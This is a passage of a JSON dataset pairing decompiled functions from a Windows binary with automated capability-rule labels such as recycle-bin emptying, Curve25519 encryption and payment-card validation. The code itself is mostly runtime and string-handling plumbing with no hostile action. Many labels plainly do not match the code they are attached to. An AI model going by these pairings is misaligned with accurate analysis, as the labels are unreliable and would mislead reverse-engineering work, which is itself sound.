        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412001(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00403e20();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0040be41(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x41cdf8) + 0x28 + (arg_8h_00 & 0x3f) * 0x30) & 1) == 0) {\n        puVar2 = fcn.00409404();\n        *puVar2 = 9;\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.0041212a(arg_8h_00);\n    }\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00412077(0x41a680, noname_1, unaff_retaddr);\n    fcn.00403e66();\n    return;\n}\n",
        "token_count": 374
    },
    "004120ab": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004120ab(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *var_4h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.004093f1();\n        *puVar1 = 0;\n        puVar1 = fcn.00409404();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x41cff8)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x41cdf8) + 0x28 + (arg_8h & 0x3f) * 0x30) & 1) != 0)) {\n            var_4h = &arg_8h;\n            uVar2 = fcn.00412083(arg_8h, &var_4h);\n            return uVar2;\n        }\n        puVar1 = fcn.004093f1();\n        *puVar1 = 0;\n        puVar1 = fcn.00409404();\n        *puVar1 = 9;\n        fcn.00406dd6();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 288
    },
    "00403e7b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403ebc)\n// WARNING: Removing unreachable block (ram,0x00403f6c)\n// WARNING: Removing unreachable block (ram,0x00403ef6)\n\nuint fcn.00403e7b(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x41cbbc = 0;\n    *0x41c010 = *0x41c010 | 1;\n    iVar4 = sub.KERNEL32.dll_IsProcessorFeaturePresent(10);\n    uVar3 = *0x41c010;\n    if (iVar4 != 0) {\n        var_10h = 0;\n        *0x41c010 = *0x41c010 | 2;\n        *0x41cbbc = 1;\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar6 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar5 = *puVar2 & 0xfff3ff0,  uVar5 == 0x106c0 || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n             ((uVar5 == 0x30650 || (uVar5 == 0x30660)))) || (uVar5 == 0x30670)))) {\n            *0x41cbc0 = *0x41cbc0 | 1;\n        }\n        if (6 < *piVar1) {\n            iVar4 = cpuid_Extended_Feature_Enumeration_info(7);\n            var_10h = *(iVar4 + 4);\n            if ((var_10h & 0x200) != 0) {\n                *0x41cbc0 = *0x41cbc0 | 2;\n            }\n        }\n        if ((uVar6 & 0x100000) != 0) {\n            *0x41c010 = uVar3 | 6;\n            *0x41cbbc = 2;\n            if ((((uVar6 & 0x8000000) != 0) && ((uVar6 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x41c010 = uVar3 | 0xe;\n                *0x41cbbc = 3;\n                if ((var_10h & 0x20) != 0) {\n                    *0x41c010 = uVar3 | 0x2e;\n                    *0x41cbbc = 5;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 761
    },
    "0040af01": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.0040af01(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    char **ppcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char **ppcVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    char **ppcVar11;\n    char **var_20h;\n    char **var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar5 = fcn.00409404();\n        iVar9 = 0x16;\n        *puVar5 = 0x16;\n        fcn.00406dd6();\n    }\n    else {\n        *arg_ch = 0;\n        var_20h = NULL;\n        var_1ch = NULL;\n        var_18h = 0;\n        iVar9 = *arg_8h;\n        ppcVar11 = var_20h;\n        ppcVar4 = var_1ch;\n        while (var_20h = ppcVar11,  var_1ch = ppcVar4,  iVar9 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar9 = fcn.00410300(*arg_8h, &var_4h);\n            if (iVar9 == 0) {\n                iVar9 = fcn.0040ac06(*arg_8h, 0, 0, &var_20h);\n            }\n            else {\n                iVar9 = fcn.0040ac9c(*arg_8h, iVar9, &var_20h);\n            }\n            if (iVar9 != 0) goto code_r0x0040abe8;\n            arg_8h = arg_8h + 1;\n            ppcVar11 = var_20h;\n            ppcVar4 = var_1ch;\n            iVar9 = *arg_8h;\n        }\n        var_8h = NULL;\n        var_4h = NULL;\n        var_ch = (ppcVar4 - ppcVar11 >> 2) + 1;\n        pcVar10 = ~-(ppcVar4 < ppcVar11) & (ppcVar4 - ppcVar11) + 3U >> 2;\n        if (pcVar10 != NULL) {\n            var_4h = NULL;\n            ppcVar8 = ppcVar11;\n            do {\n                pcVar7 = *ppcVar8;\n                pcVar1 = pcVar7 + 1;\n                do {\n                    cVar2 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar2 != '\\0');\n                var_4h = pcVar7 + var_4h + (1 - pcVar1);\n                ppcVar8 = ppcVar8 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h != pcVar10);\n        }\n        iVar6 = fcn.0040741d(var_ch, var_4h, 1);\n        if (iVar6 == 0) {\n            iVar9 = -1;\n        }\n        else {\n            var_ch = iVar6 + var_ch * 4;\n            var_10h = var_ch;\n            if (ppcVar11 != ppcVar4) {\n                var_14h = iVar6 - ppcVar11;\n                do {\n                    var_8h = *ppcVar11;\n                    pcVar10 = var_8h + 1;\n                    do {\n                        cVar2 = *var_8h;\n                        var_8h = var_8h + 1;\n                    } while (cVar2 != '\\0');\n                    var_8h = var_8h + (1 - pcVar10);\n                    iVar9 = fcn.004102eb(var_ch, var_4h + (var_10h - var_ch), *ppcVar11, var_8h);\n                    if (iVar9 != 0) {\n                        fcn.00406e03(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        iVar9 = (*pcVar3)();\n                        return iVar9;\n                    }\n                    *(var_14h + ppcVar11) = var_ch;\n                    ppcVar11 = ppcVar11 + 1;\n                    var_ch = var_ch + var_8h;\n                } while (ppcVar11 != ppcVar4);\n            }\n            iVar9 = 0;\n            *arg_ch = iVar6;\n        }\n        fcn.0040826e(0);\ncode_r0x0040abe8:\n        fcn.0040ae20();\n    }\n    return iVar9;\n}\n",
        "token_count": 1142
    },
    "004068e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004068e8(uint *param_1)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    iVar1 = *(param_1[5] + -4);\n    param_1[0xd] = iVar1;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.00405a07(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar2 == '\\0') {\n        if (iVar1 == 0) {\n            param_1[0xd] = 0x414bbc;\n        }\n        uVar3 = fcn.0040695c(arg_8h);\n    }\n    else {\n        if (iVar1 == 0) {\n            param_1[0xd] = L\"(null)\";\n        }\n        *(param_1 + 0xf) = 1;\n        uVar3 = fcn.00409572(param_1[0xd], arg_8h);\n    }\n    param_1[0xe] = uVar3;\n    return 1;\n}\n",
        "token_count": 313
    },
    "004102eb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004102eb(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0041025c:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    iVar4 = arg_ch;\n                    pcVar5 = arg_8h;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar5[arg_10h - arg_8h];\n                            *pcVar5 = cVar1;\n                            pcVar5 = pcVar5 + 1;\n                            if (cVar1 == '\\0') break;\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar5[arg_10h - arg_8h];\n                            *pcVar5 = cVar1;\n                            pcVar5 = pcVar5 + 1;\n                            if ((cVar1 == '\\0') || (iVar4 = iVar4 + -1,  iVar4 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *pcVar5 = '\\0';\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.00409404();\n                    uVar6 = 0x22;\n                    goto code_r0x0041027c;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0041025c;\n    puVar2 = fcn.00409404();\n    uVar6 = 0x16;\ncode_r0x0041027c:\n    *puVar2 = uVar6;\n    fcn.00406dd6();\n    return uVar6;\n}\n",
        "token_count": 612
    },
    "0040be41": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be41(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x41cdf8));\n    return;\n}\n",
        "token_count": 69
    },
    "0040be64": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be64(uint32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)\n              ((lpCriticalSection & 0x3f) * 0x30 + *((lpCriticalSection >> 6) * 4 + 0x41cdf8));\n    return;\n}\n",
        "token_count": 70
    },
    "0040c860": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c860(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00403e20();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0040a9ff(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x41c004 & 0x1f;\n    *(unaff_EBP + -0x1c) = (*0x41c004 ^ *0x41d264) >> uVar1 | (*0x41c004 ^ *0x41d264) << 0x20 - uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040c8ae(0x41a598, noname_1, unaff_retaddr);\n    fcn.00403e66();\n    return;\n}\n",
        "token_count": 279
    },
    "00401053": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401053(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t in_ECX;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    \n    if ((in_EDX <= 0xffffffff / arg_8h) &&\n       ((uVar2 = in_ECX,  in_EDX * arg_8h < 0x1000 ||\n        (((((in_ECX & 0x1f) == 0 && (uVar2 = *(in_ECX - 4),  uVar2 < in_ECX)) && (3 < in_ECX - uVar2)) &&\n         (in_ECX - uVar2 < 0x24)))))) {\n        fcn.004033f4(uVar2);\n        return;\n    }\n    fcn.00406de6();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 209
    },
    "00402b43": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402b43(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t *in_ECX;\n    \n    uVar1 = in_ECX[1];\n    if ((arg_8h < uVar1) && (*in_ECX < arg_8h || *in_ECX == arg_8h)) {\n        uVar2 = *in_ECX;\n        if (uVar1 == in_ECX[2]) {\n            fcn.00402c45(uVar1);\n        }\n        if (in_ECX[1] != 0) {\n            fcn.00402bae(((arg_8h - uVar2) / 0x18) * 0x18 + *in_ECX);\n        }\n        in_ECX[1] = in_ECX[1] + 0x18;\n    }\n    else {\n        if (uVar1 == in_ECX[2]) {\n            fcn.00402c45(uVar1);\n        }\n        if (in_ECX[1] != 0) {\n            fcn.00402bae(arg_8h);\n        }\n        in_ECX[1] = in_ECX[1] + 0x18;\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "00402d97": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d97(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint *in_ECX;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    \n    if (arg_8h[4] < arg_ch) {\ncode_r0x00402e35:\n        fcn.00403383(\"invalid string position\");\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar3 = arg_8h[4] - arg_ch;\n    if (uVar3 < arg_10h) {\n        arg_10h = uVar3;\n    }\n    if (in_ECX == arg_8h) {\n        arg_10h = arg_ch + arg_10h;\n        if (in_ECX[4] < arg_10h) goto code_r0x00402e35;\n        in_ECX[4] = arg_10h;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *(in_ECX + arg_10h) = 0;\n        fcn.00402f47(arg_10h, arg_ch);\n    }\n    else {\n        uVar5 = arg_10h;\n        cVar2 = fcn.00402f04(arg_10h);\n        if (cVar2 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar4 = *in_ECX;\n            }\n            if (arg_10h != 0) {\n                fcn.004045b0(puVar4, arg_ch + arg_8h, arg_10h, uVar5, uVar3);\n            }\n            in_ECX[4] = arg_10h;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + arg_10h) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 510
    },
    "0040c34c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c34c(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040826e(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00402aea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402aea(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *param_1;\n    if (iVar2 != 0) {\n        iVar1 = param_1[1];\n        for (; iVar2 != iVar1; iVar2 = iVar2 + 0x18) {\n            fcn.00402cb1(1, 0);\n        }\n        fcn.00401053(0x18);\n        *param_1 = 0;\n        param_1[1] = 0;\n        param_1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00402bae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402bae(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[5] = 0xf;\n    in_ECX[4] = 0;\n    *in_ECX = 0;\n    if (arg_8h[5] < 0x10) {\n        if (arg_8h[4] != -1) {\n            fcn.00404030();\n        }\n    }\n    else {\n        *in_ECX = *arg_8h;\n        *arg_8h = 0;\n    }\n    in_ECX[4] = arg_8h[4];\n    in_ECX[5] = arg_8h[5];\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    if (0xf < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    *arg_8h = 0;\n    return;\n}\n",
        "token_count": 227
    },
    "00402d04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d04(uint *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_ECX;\n    int32_t iVar4;\n    \n    puVar2 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar3 = *in_ECX;\n        }\n        if (puVar3 <= arg_8h) {\n            if (0xf < in_ECX[5]) {\n                puVar2 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + puVar2) {\n                puVar2 = in_ECX;\n                if (0xf < in_ECX[5]) {\n                    puVar2 = *in_ECX;\n                }\n                fcn.00402d97(in_ECX, arg_8h - puVar2, arg_ch);\n                return;\n            }\n        }\n    }\n    iVar4 = arg_ch;\n    cVar1 = fcn.00402f04(arg_ch);\n    if (cVar1 != '\\0') {\n        puVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar3 = *in_ECX;\n        }\n        if (arg_ch != 0) {\n            fcn.004045b0(puVar3, arg_8h, arg_ch, iVar4, puVar2);\n        }\n        in_ECX[4] = arg_ch;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *(in_ECX + arg_ch) = 0;\n    }\n    return;\n}\n",
        "token_count": 401
    },
    "00402e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid __cdecl fcn.00402e40(uint arg_8h_2, uint noname_1, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t *extraout_ECX;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_4h;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h_2;\n    \n    var_4h_2 = 0x402e4c;\n    fcn.00412c40();\n    *(unaff_EBP + -0x1c) = 0x18;\n    arg_8h_00 = fcn.00401006();\n    *(unaff_EBP + -0x14) = arg_8h_00;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x20) = &fcn.00402e40::var_4h_2;\n    fcn.004030a5(arg_8h_00);\n    *(unaff_EBP + -4) = 0xffffffff;\n    iVar1 = extraout_ECX[1];\n    *(unaff_EBP + -0x18) = iVar1;\n    iVar2 = *extraout_ECX;\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -0x1c) = (iVar1 - iVar2) / *(unaff_EBP + -0x1c);\n    if (iVar2 != 0) {\n        while (iVar2 != *(unaff_EBP + -0x18)) {\n            var_4h_2 = 0;\n            fcn.00402cb1(1, 0);\n            iVar2 = *(unaff_EBP + -0x14) + 0x18;\n            *(unaff_EBP + -0x14) = iVar2;\n        }\n        var_4h_2 = 0x18;\n        fcn.00401053(0x18);\n    }\n    extraout_ECX[2] = *(unaff_EBP + 8) * 0x18 + arg_8h_00;\n    extraout_ECX[1] = *(unaff_EBP + -0x1c) * 0x18 + arg_8h_00;\n    *extraout_ECX = arg_8h_00;\n    var_4h_2 = 0x402ee9;\n    fcn.00412c2b();\n    return;\n}\n",
        "token_count": 661
    },
    "00402f47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f47(uint noname_0, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (arg_ch < in_ECX[4]) {\n        if (arg_ch != 0) {\n            puVar1 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                puVar1 = *in_ECX;\n            }\n            iVar2 = in_ECX[4] - arg_ch;\n            if (iVar2 != 0) {\n                fcn.00404030(puVar1, arg_ch + puVar1, iVar2);\n            }\n            in_ECX[4] = iVar2;\n            if (0xf < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            *(in_ECX + iVar2) = 0;\n        }\n    }\n    else {\n        in_ECX[4] = 0;\n        if (0xf < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        *in_ECX = 0;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "004030a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004030a5(uint arg_8h)\n\n{\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00412c40(0xc);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = extraout_ECX;\n    while (arg_8h_00 != extraout_EDX) {\n        if (iVar1 != 0) {\n            fcn.00402bae(arg_8h_00);\n        }\n        iVar1 = iVar1 + 0x18;\n        *(unaff_EBP + 8) = iVar1;\n        arg_8h_00 = arg_8h_00 + 0x18;\n        *(unaff_EBP + -0x18) = arg_8h_00;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00412c2b();\n    return;\n}\n",
        "token_count": 309
    },
    "004057d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_2c8h;\n    \n    fcn.00409139(arg_8h, arg_ch);\n    fcn.00409139(arg_10h, arg_14h);\n    fcn.0040dc07();\n    fcn.00408fb8();\n    return;\n}\n",
        "token_count": 98
    },
    "00405ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405ffc(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00405e07(param_1 + 0x28);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x28) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x28) = 0xffffffff;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 184
    },
    "004063fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004063fe(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00405e07(param_1 + 0x24);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *(param_1 + 0x24) = iVar1;\n    if (iVar1 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        *(param_1 + 0x24) = -*(param_1 + 0x24);\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 217
    },
    "00406b21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00406b21(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    fcn.004057e4(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 97
    },
    "0040784e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040784e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.004126e0(0x41a3b0, 0xc);\n    iVar1 = *(unaff_EBP + 0x10);\n    if (iVar1 == 0) {\n        cVar5 = fcn.004079a8();\n        if (cVar5 != '\\0') {\n            fcn.004079ec(*(unaff_EBP + 8));\n        }\n    }\n    fcn.0040a9ff(2);\n    *(unaff_EBP + -4) = 0;\n    if (*0x41cdb4 != '\\0') goto code_r0x00407925;\n    *0x41cdac = 1;\n    *(unaff_EBP + -4) = 1;\n    iVar2 = *(unaff_EBP + 0xc);\n    if (iVar2 == 0) {\n        uVar4 = *0x41c004 & 0x1f;\n        uVar3 = 0x20 - uVar4 & 0x1f;\n        if (*0x41cdb0 != ((0U >> uVar3 | 0 << 0x20 - uVar3) ^ *0x41c004)) {\n            uVar6 = *0x41c004 ^ *0x41cdb0;\n            (**0x414180)(0, 0, 0);\n            (*(uVar6 >> uVar4 | uVar6 << 0x20 - uVar4))();\n        }\n        arg_8h_00 = 0x41cdc4;\ncode_r0x004078ea:\n        fcn.00407fa6(arg_8h_00);\n    }\n    else if (iVar2 == 1) {\n        arg_8h_00 = 0x41cdd0;\n        goto code_r0x004078ea;\n    }\n    *(unaff_EBP + -4) = 0;\n    if (iVar2 == 0) {\n        fcn.0040777b(0x4141b4, 0x4141c4);\n    }\n    fcn.0040777b(0x4141c8, 0x4141cc);\n    if (iVar1 == 0) {\n        *0x41cdb4 = '\\x01';\n    }\ncode_r0x00407925:\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00407958();\n    if (iVar1 == 0) {\n        fcn.00407967(*(unaff_EBP + 8));\n        fcn.0040783b(***(unaff_EBP + -0x14));\n        return;\n    }\n    fcn.00412729();\n    return;\n}\n",
        "token_count": 714
    },
    "00409106": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409106(uint arg_8h, uint arg_ch)\n\n{\n    uint var_2c8h;\n    \n    fcn.00409139(arg_8h, arg_ch);\n    fcn.0040dba0();\n    fcn.00408fb8();\n    return;\n}\n",
        "token_count": 68
    },
    "00409432": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
